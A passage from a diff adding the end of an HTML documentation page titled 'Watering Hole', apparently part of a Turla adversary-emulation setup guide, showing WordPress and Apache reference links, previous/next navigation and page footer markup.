+<li>Wordpress reference: <a href="https://developer.wordpress.org/cli/commands/">https://developer.wordpress.org/cli/commands/</a></li>
+<li>Apache configuration reference: <a href="https://httpd.apache.org/docs/current/configuring.html">https://httpd.apache.org/docs/current/configuring.html</a></li>
+<li>Create new Apache configuration: <a href="https://ubuntu.com/tutorials/install-and-configure-apache">https://ubuntu.com/tutorials/install-and-configure-apache</a></li>
+</ul>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../../enterprise/turla/resources/setup/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Turla Setup Procedure</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../../enterprise/turla/resources/setup/terraform/evals-ranges/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">R​5 Infrastructure Project</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Watering Hole", level: 6, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
